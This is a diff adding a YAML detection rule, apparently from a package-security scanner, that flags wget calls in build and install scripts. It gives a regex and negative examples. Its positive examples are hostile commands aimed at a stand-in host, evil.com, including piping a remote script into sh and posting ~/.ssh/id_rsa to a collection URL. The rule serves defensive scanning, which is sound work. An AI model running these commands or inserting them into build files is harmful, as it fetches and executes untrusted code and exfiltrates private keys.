@@ -1,0 +1,35 @@
+name: wget
+version: "0.1.0"
+attck:
+  - T1041
+  - T1105
+message: >-
+  wget fetches a remote resource or sends data to a remote host. In a shell
+  script or Make-like file it runs when the package is built, checked, or
+  installed, and may be used to fetch a remote payload or to exfiltrate
+  credentials or other data.
+regex: '(?<=^|[^[:alnum:]_-])wget(?=(\.exe)?([^[:alnum:]_./-]|$))'
+positive_examples:
+  - |
+    wget https://www.evil.com/evil.sh
+  - |
+    /usr/bin/wget -q -O - https://www.evil.com/evil.sh | sh
+  - |
+    FETCH := $(shell wget -qO- https://www.evil.com/payload)
+  - |
+    wget --post-file=$HOME/.ssh/id_rsa https://www.evil.com/collect
+  - |
+    wget.exe -q https://www.evil.com/evil.sh
+negative_examples:
+  - |
+    wgetopt_long(argc, argv)
+  - |
+    enable_wget_fallback=yes
+  - |
+    PKG_LIBS="-lwget2"
+  - |
+    AC_MSG_ERROR([libwget not found])
+  - |
+    #include <wget/wget.h>
+  - |
+    # Manual: https://www.gnu.org/software/wget/manual/wget.html
